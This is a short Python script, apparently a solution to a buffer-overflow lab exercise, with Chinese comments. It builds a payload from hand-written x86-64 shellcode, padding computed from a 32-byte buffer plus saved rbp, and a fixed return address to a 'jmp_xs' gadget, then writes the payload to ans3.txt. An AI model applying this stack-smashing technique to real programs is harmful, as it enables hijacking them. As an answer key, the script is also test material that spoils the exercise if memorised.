# 编写 Shellcode
shellcode = b"\xbf\x72\x00\x00\x00" + \
            b"\x48\xc7\xc0\x16\x12\x40\x00" + \
            b"\xff\xe0"

# 计算填充
# 缓冲区起始到返回地址的距离是 0x20 (32) + 0x8 (saved rbp) = 40 字节
padding_size = 40 - len(shellcode)
padding = b"A" * padding_size

# 目标跳转地址 (jmp_xs 的地址)
target_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00" 

payload = shellcode + padding + target_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload generated in ans3.txt")